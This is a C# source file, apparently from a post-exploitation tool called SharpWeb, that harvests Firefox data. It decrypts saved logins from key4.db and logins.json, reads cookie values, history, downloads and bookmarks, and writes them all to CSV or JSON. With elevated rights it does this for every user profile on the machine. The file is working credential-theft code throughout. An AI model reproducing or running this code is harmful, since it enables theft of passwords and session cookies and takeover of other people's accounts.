using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Cryptography;
using System.Web.Script.Serialization;
using System.Collections.Generic;
using SharpWeb.Browsers.Firefox;
using SharpWeb.Utilities;
using static SharpWeb.Utilities.Current;
using static SharpWeb.Display.OutputFormatting;
using Community.CsharpSqlite.SQLiteClient;


namespace SharpWeb.Browsers
{
    internal class FireFox
    {
        public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
        {
            string plaintext = null;

            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;
        }

        public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
        {
            byte[] decrypted = new byte[512];

            using (TripleDESCryptoServiceProvider tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(input))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(decrypted, 0, decrypted.Length);
                    }
                }

            }

            return decrypted;
        }

        public static byte[] AESDecrypt(byte[] encryptedBytes, byte[] Key, byte[] Vector)
        {
            byte[] array = new byte[32];
            Array.Copy(Key, array, array.Length);
            byte[] array2 = new byte[16];
            Array.Copy(Vector, array2, array2.Length);
            byte[] result = null;
            Rijndael rijndael = Rijndael.Create();
            try
            {
                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(array, array2), CryptoStreamMode.Read))
                    {
                        using (MemoryStream memoryStream2 = new MemoryStream())
                        {
                            byte[] array3 = new byte[1024];
                            int count;
                            while ((count = cryptoStream.Read(array3, 0, array3.Length)) > 0)
                            {
                                memoryStream2.Write(array3, 0, count);
                            }
                            result = memoryStream2.ToArray();
                        }
                    }
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }
        public static byte[] byteCpy(byte[] byteSource, byte[] newData)
        {
            byte[] array = new byte[byteSource.Length + newData.Length];
            Array.Copy(byteSource, array, byteSource.Length);
            Array.Copy(newData, 0, array, byteSource.Length, newData.Length);
            return array;
        }

        public static byte[] decryptPEB(Asn1DerObject asn, byte[] masterPassword, byte[] globalSalt)
        {
            string oidVal = asn.objects[0].objects[0].objects[0].ToString();
            bool flag = oidVal.Contains("1.2.840.113549.1.12.5.1.3");
            byte[] result = null;
            if (flag)
            {
                byte[] data = asn.objects[0].objects[0].objects[1].objects[0].Data;
                byte[] data2 = asn.objects[0].objects[1].Data;
                MozillaPBE mozillaPBE = new MozillaPBE(globalSalt, Encoding.ASCII.GetBytes(""), data);
                mozillaPBE.Compute();
                byte[] source = DESCBCDecryptorByte(mozillaPBE.Key, mozillaPBE.IV, data2);
                result = source.Skip(0).Take(24).ToArray<byte>();
            }
            else if (oidVal.Contains("1.2.840.113549.1.5.13"))
            {
                byte[] data3 = asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                int iterations = (int)asn.objects[0].objects[0].objects[1].objects[0].objects[1].objects[1].Data[0];

                byte[] password = SHA1.Create().ComputeHash(globalSalt);
                HMACSHA256 algorithm = new HMACSHA256();
                Pbkdf2 pbkdf = new Pbkdf2(algorithm, password, data3, iterations);
                byte[] bytes = pbkdf.GetBytes(32);
                byte[] byteSource = new byte[] { 4, 14 };
                byte[] vector = byteCpy(byteSource, asn.objects[0].objects[0].objects[1].objects[2].objects[1].Data);
                byte[] data4 = asn.objects[0].objects[1].Data;
                byte[] array = AESDecrypt(data4, bytes, vector);
                result = array;
            }
            return result;
        }

        public static byte[] dataToParse2(string userFireFoxdbPath_tempFile)
        {
            SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", userFireFoxdbPath_tempFile));
            con.Open();
            SqliteCommand query = new SqliteCommand("SELECT a11,a102 FROM nssPrivate", con);
            SqliteDataReader reader = query.ExecuteReader();

            byte[] a = null;
            while (reader.Read())
            {
                a = (byte[])(reader.GetValue(0));
            }
            con.Close();
            return a;

        }

        public static void Find_Password(string userFireFoxdbPath, string userFireFoxloginPath)
        {
            try
            {
                Asn1Der asn1Der = new Asn1Der();
                bool flag = File.Exists(userFireFoxdbPath) && File.Exists(userFireFoxloginPath);
                if (flag)
                {
                    string[] header = new string[] { "URL", "USERNAME", "PASSWORD" };
                    List<string[]> data = new List<string[]> { };
                    string fileName = Path.Combine("out", "FireFox_password");


                    string userFireFoxdbPath_tempFile = Path.GetTempFileName();
                    File.Copy(userFireFoxdbPath, userFireFoxdbPath_tempFile, true);

                    string userFireFoxloginPath_tempFile = Path.GetTempFileName();
                    File.Copy(userFireFoxloginPath, userFireFoxloginPath_tempFile, true);

                    SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", userFireFoxdbPath_tempFile));
                    con.Open();
                    SqliteCommand query = new SqliteCommand("SELECT item1, item2 FROM metadata WHERE id = 'password'", con);
                    SqliteDataReader reader = query.ExecuteReader();


                    byte[] globalSalt = null, dataToParse = null;
                    while (reader.Read())
                    {
                        globalSalt = (byte[])(reader.GetValue(0));
                        dataToParse = (byte[])(reader.GetValue(1));
                    }
                    con.Close();

                    Asn1DerObject asn = asn1Der.Parse(dataToParse);
                    byte[] array = FireFox.decryptPEB(asn, Encoding.ASCII.GetBytes(""), globalSalt);

                    Asn1DerObject asn2 = asn1Der.Parse(dataToParse2(userFireFoxdbPath_tempFile));
                    byte[] key = FireFox.decryptPEB(asn2, Encoding.ASCII.GetBytes(""), globalSalt);

                    using (StreamReader streamReader = new StreamReader(userFireFoxloginPath_tempFile))
                    {
                        string value = streamReader.ReadToEnd();
                        JavaScriptSerializer serializer = new JavaScriptSerializer();
                        dynamic jsonObject = serializer.Deserialize<dynamic>(value);

                        // 提取 logins 数组
                        var loginsArray = jsonObject["logins"];

                        if (loginsArray != null)
                        {
                            foreach (var login in loginsArray)
                            {
                                string hostname = login["hostname"];
                                string encryptedUsername = login["encryptedUsername"];
                                string encryptedPassword = login["encryptedPassword"];

                                Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(encryptedUsername));
                                Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(encryptedPassword));
                                string input = DESCBCDecryptor(key, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data);
                                string input2 = DESCBCDecryptor(key, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data);
                                string Username = Regex.Replace(input, "[^\\u0020-\\u007F]", "");
                                string Password = Regex.Replace(input2, "[^\\u0020-\\u007F]", "");
                                PrintNorma("    ---------------------------------------------------------");
                                PrintSuccess(String.Format("{0}: {1}", "URL", hostname), 1);
                                PrintSuccess(String.Format("{0}: {1}", "USERNAME", Username), 1);
                                PrintSuccess(String.Format("{0}: {1}", "PASSWORD", Password), 1);
                                data.Add(new string[] { hostname, Username, Password });
                            }
                        }
                    }
                    File.Delete(userFireFoxdbPath_tempFile);
                    File.Delete(userFireFoxloginPath_tempFile);
                    if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                        WriteJson(header, data, fileName);
                    else
                        WriteCSV(header, data, fileName);
                }
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", userFireFoxdbPath), 1);
            }
            Console.WriteLine();
        }

        public static void Firefox_Cookie(string cookie_path)
        {
            try
            {
                string cookies_tempFile = CreateTmpFile(cookie_path);

                string patchedcookieDB = PatchWALDatabase(cookies_tempFile);

                string[] Jsonheader = new string[] { "domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value" };
                List<string[]> Jsondata = new List<string[]> { };

                string[] header = new string[] { "HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "CreateDate", "ExpireDate" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", "FireFox_cookie");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedcookieDB));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
                drop.ExecuteNonQuery();
                SqliteCommand query = new SqliteCommand("SELECT name,value,host,path,creationTime,expiry,lastAccessed,isSecure,isHttpOnly,samesite FROM moz_cookies", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    PrintNorma("    ---------------------------------------------------------");
                    string name = reader.GetValue(0).ToString();
                    string value = reader.GetValue(1).ToString();
                    string host = reader.GetValue(2).ToString();
                    string path = reader.GetValue(3).ToString();

                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(4).ToString()) / 1000000).ToString();
                    string accessTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(6).ToString()) / 1000000).ToString();
                    string expiry = TypeUtil.TimeStamp(long.Parse(reader.GetValue(5).ToString())).ToString();
                    string isSecure = is_true_false(reader.GetValue(7).ToString());
                    string isHttpOnly = is_true_false(reader.GetValue(8).ToString());
                    string sameSiteString = TryParsesameSite(reader.GetValue(9).ToString());
                    string cookie = String.Format("{0}={1}", name, value);

                    data.Add(new string[] { host, cookie, path, isSecure, isHttpOnly, creationTime, expiry });
                    Jsondata.Add(new string[] { host, reader.GetValue(5).ToString(), "false", isHttpOnly, name, path, sameSiteString, isSecure, "true", "0", value });

                    PrintSuccess(String.Format("HOST: {0}", host), 1);
                    PrintSuccess(String.Format("COOKIE: {0}={1},path={2}", name, value, path), 1);
                    PrintSuccess(String.Format("CreateDate: {0}", creationTime), 1);
                    PrintSuccess(String.Format("ExpireDate: {0}", expiry), 1);
                    PrintSuccess(String.Format("Path: {0}", path), 1);
                }
                con.Close();
                File.Delete(cookies_tempFile);
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(Jsonheader, Jsondata, fileName);
                else
                    WriteCSV(header, data, fileName);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", cookie_path), 1);
            }
            Console.WriteLine();
        }


        public static void Histroy(string places_path)
        {
            try
            {
                string places_tempFile = CreateTmpFile(places_path);

                string patchedhistroyDB = PatchWALDatabase(places_tempFile);

                PrintVerbose("Get Firefox Historys");

                string[] header = new string[] { "URL", "TITLE", "TIME" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", "FireFox_history");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedhistroyDB));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
                drop.ExecuteNonQuery();

                SqliteCommand query = new SqliteCommand("SELECT url, COALESCE(last_visit_date, 0), COALESCE(title, ''), visit_count FROM moz_places", con);

                SqliteDataReader reader = query.ExecuteReader();

                while (reader.Read())
                {
                    string url = reader.GetValue(0).ToString();
                    string title = reader.GetValue(2).ToString();
                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(1).ToString()) / 1000000).ToString();
                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("URL: {0}", url), 1);
                    PrintSuccess(String.Format("TITLE: {0}", title), 1);
                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
                    data.Add(new string[] { url, title, creationTime });
                }
                con.Close();
                File.Delete(places_tempFile);
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", places_path), 1);
            }
            Console.WriteLine();
        }

        public static void Download(string places_path)
        {
            try
            {
                string places_tempFile = CreateTmpFile(places_path);

                string patcheddownloadDB = PatchWALDatabase(places_tempFile);

                PrintVerbose("Get Firefox Downloads");

                string[] header = new string[] { "URL", "PATH", "TIME" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", "FireFox_download");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patcheddownloadDB));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
                drop.ExecuteNonQuery();
                SqliteCommand query = new SqliteCommand("SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    string path = reader.GetValue(0).ToString();
                    string url = reader.GetValue(1).ToString();
                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(2).ToString()) / 1000000).ToString();
                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("URL: {0}", url), 1);
                    PrintSuccess(String.Format("PATH: {0}", path), 1);
                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
                    data.Add(new string[] { url, path, creationTime });
                }
                con.Close();
                File.Delete(places_tempFile);
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", places_path), 1);
            }
            Console.WriteLine();
        }


        public static void Bookmarks(string places_path)
        {
            try
            {
                string places_tempFile = CreateTmpFile(places_path);

                string patchedbookmarksDB = PatchWALDatabase(places_tempFile);

                PrintVerbose("Get Firefox Bookmarks");

                string[] header = new string[] { "URL", "TITLE", "TIME" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", "FireFox_bookmark");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedbookmarksDB));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
                drop.ExecuteNonQuery();
                SqliteCommand query = new SqliteCommand("SELECT url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {

                    string url = reader.GetValue(0).ToString();
                    string title = reader.GetValue(2).ToString();
                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(1).ToString()) / 1000000).ToString();
                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("URL: {0}", url), 1);
                    PrintSuccess(String.Format("TITLE: {0}", title), 1);
                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
                    data.Add(new string[] { url, title, creationTime });
                }
                con.Close();
                File.Delete(places_tempFile);
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", places_path), 1);
            }
            Console.WriteLine();
        }

        public static void GetFireFox()
        {
            try
            {
                if (IsHighIntegrity())
                {
                    Console.WriteLine("========================== FireFox (All Users) ==========================");

                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        bool flag = dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users");
                        if (flag)
                            continue;
                        List<string> path_List = Directory.GetDirectories(dir + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles").ToList<string>();
                        foreach (string path in path_List)
                        {
                            string keydb_patch = String.Format("{0}\\key4.db", path);
                            string json_patch = String.Format("{0}\\logins.json", path);
                            string cookie_path = String.Format("{0}\\cookies.sqlite", path);
                            string places_path = String.Format("{0}\\places.sqlite", path);
                            string[] firefoxPaths = { keydb_patch, json_patch, cookie_path };
                            if (FileExists(firefoxPaths))
                            {
                                PrintVerbose(String.Format("{0} : {1}", "Found Firefox profile", path));
                                PrintVerbose("Get FireFox Password");
                                Find_Password(keydb_patch, json_patch);
                                PrintVerbose("Get FireFox Cookie");
                                Firefox_Cookie(cookie_path);
                                Histroy(places_path);
                                Download(places_path);
                                Bookmarks(places_path);
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("========================== FireFox (Current Users) ==========================");
                    List<string> path_List = Directory.GetDirectories(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles").ToList<string>();
                    foreach (string path in path_List)
                    {
                        string keydb_patch = String.Format("{0}\\key4.db", path);
                        string json_patch = String.Format("{0}\\logins.json", path);
                        string cookie_path = String.Format("{0}\\cookies.sqlite", path);
                        string places_path = String.Format("{0}\\places.sqlite", path);
                        string[] firefoxPaths = { keydb_patch, json_patch, cookie_path };
                        if (FileExists(firefoxPaths))
                        {
                            PrintVerbose(String.Format("{0} : {1}", "Found Firefox profile", path));
                            PrintVerbose("Get FireFox Password");
                            Find_Password(keydb_patch, json_patch);
                            PrintVerbose("Get FireFox Cookie");
                            Firefox_Cookie(cookie_path);
                            Histroy(places_path);
                            Download(places_path);
                            Bookmarks(places_path);
                        }
                    }
                }
            }
            catch
            {
                PrintFail("Not Found");
            }
            Console.WriteLine();
        }
    }
}
